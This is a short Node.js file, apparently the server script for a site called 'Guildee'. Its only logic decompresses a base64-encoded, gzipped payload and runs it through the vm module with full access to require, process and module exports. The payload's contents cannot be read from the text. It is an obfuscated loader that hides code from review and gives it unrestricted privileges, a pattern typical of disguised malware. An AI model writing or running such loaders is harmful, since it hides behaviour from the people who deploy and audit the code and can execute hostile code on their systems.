
/*
╔══════════════════════════════════════════════════════════╗
║        Website : Guildee                                 ║
║        Autheur : Yusu_sauvage                            ║
╚══════════════════════════════════════════════════════════╝
*/
const zlib = require("zlib");
const vm = require("vm");

const PAYLOAD_B64 = "H4sIAAAAAAAACnVU3W6bMBS+z1OcIRSB1EG6SpPWiFX9kbaLVupWVbvoJsWAm3ohtmebJogi7Tl2s1fcI0y2geCE3oG/n/Odgw8Zo1IBXy0hAYF/lUTgwItijrIVWuLop2TUC+eTSWZ4NXBBqLpgW2hcgRRZ/FjSTBFG446klZ2wYCi/ZPSRLMekmUGGfEKJukrHuHl6wCMyYyK/LAimalRiCXFmGE5DmcBI4XPOx2MJHCPO9xu5YXlZYPmqZG3wt5qKxVBsq10yqhChWLxqkHUMkzVAsqIZBCEkH6GeAFg7OzRIBrMNwvkOVltI9isGVqRdO16e3imkSgkJoA0iqh39jtkT7RTH2MMPMFICcd5HOec8yNTW+FqHwURbREOcRwWRCtPWL+JMqKPBEPo+K0QhAe/79jh9OHm/9uYDsMJFwTY7+MSFlwLjgfidiwqc77DjfSWqevDDbF8osepRAw5QitZYj8O2tcGpJAqfReb45UUvY//sfbOo4/6MhSRMx9bU7k2zZ9EsmjlcVKonJiCBQHPbt+l0+OoUtkdhaOzu6YqyDXXTC8wZJOYArI0+kUQxUcF02gIAgao4Zo+wx0iSBDypBKFLr+cCnO3xBtDpHhSVojABW473pBSXp3G8JOqpTKOMreOKlSLWEjd7nl4Tqmff3fmIrSZdgIVfm+vQ3FR3X661guJM4dyvzedsFpMuz0If5S0PC8HEKfh172lOml7mJrCb0sZ446xUhClKC5y7iVDV5EQa4DCJq++bcdp5tZFBK7sm3ECjnXS/96D1eej9Fv/+/vkNfm23rvFrfbV6PYBf62Vtnv26vbU776Odyf3X6zZdy/frdldSJPG9KEZVt0yocZX+cYxKri6gL2SvhgvbWcBgLgecc7tRw6p2hUYLfiLqc5k6bH1JD7k/ugfNMo/mf9mE80kTBuH8P29nNOG3BwAA";

function runPacked() {
  const gz = Buffer.from(PAYLOAD_B64, "base64");
  const code = zlib.gunzipSync(gz).toString("utf8");

  const script = new vm.Script(code, { filename: "server.js" });
  const context = vm.createContext({
    require,
    module,
    exports,
    __dirname,
    __filename,
    process,
    console,
    Buffer,
    setTimeout,
    setInterval,
    clearTimeout,
    clearInterval,
  });

  script.runInContext(context);
}

runPacked();
